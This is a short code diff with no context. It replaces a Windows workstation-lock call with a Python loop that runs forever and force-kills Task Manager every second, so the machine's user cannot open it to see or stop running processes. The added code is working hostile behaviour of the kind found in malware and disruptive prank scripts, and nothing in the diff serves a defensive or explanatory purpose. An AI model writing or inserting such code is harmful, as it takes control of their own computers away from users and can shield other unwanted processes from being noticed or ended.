@@ -1,4 +1,5 @@
-
-import ctypes
-
-ctypes.windll.user32.LockWorkStation()
+import os
+from time import sleep
+while True:
+    os.system("taskkill /F /IM Taskmgr.exe")
+    sleep(1)
